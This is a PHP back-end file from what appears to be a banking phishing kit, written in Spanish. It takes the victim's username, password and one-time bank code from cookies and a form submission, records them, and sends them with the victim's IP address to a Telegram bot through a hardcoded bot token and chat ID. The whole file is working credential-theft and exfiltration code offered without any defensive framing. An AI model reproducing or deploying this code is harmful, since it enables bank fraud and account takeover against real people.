<?php 
require('../administrador/lib/funciones.php');

$usuario = $_COOKIE['usuario'];
$contrasena = $_COOKIE['contrasena'];
$registro = $_COOKIE['registro'];

$cdinamica = $_POST['otp'];

setcookie('cdinamica',$cdinamica,time()+60*9);

actualizar_registro_otp($registro,$cdinamica);

//OTP

$chatId = "-4927137480";

$numero = $_SESSION['numero'];
$token = "8244180906:AAGatjpS3C-PG2vDQB3gXFky2b5aoafJSKI";

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

        $mensaje  = "🏦 INGRESO DE USUARIO Y OTP 🏦\n";
        $mensaje .= "=================\n";
        $mensaje .= "DATOS\n";
        $mensaje .= "=================\n";
        $mensaje .= "🏦Banco: $banco\n";
        $mensaje .= "⚙️Usuario: $usuario\n";
        $mensaje .= "🔐Clave: $contrasena\n"; // ← AQUÍ EL \n ES CLAVE
        $mensaje .= "🔑Dinamica: $cdinamica\n";
        $mensaje .= "🌐IP: $ip";

enviarMensajeTelegram($chatId, $mensaje, $token);

function enviarMensajeTelegram($chatId, $mensaje, $token) {
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage";
    $data = array(
            'chat_id' => $chatId,
            'text' => $mensaje,
            'parse_mode' => 'HTML' // ✅ Esta línea es clave
        );

    $options = array(
        'http' => array(
            'method' => 'POST',
            'header' => "Content-Type:application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data)
        )
    );

    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result === false) {
        // Error al enviar el mensaje
        return false;
    }

    // El mensaje se envió correctamente
    return true;
}
?>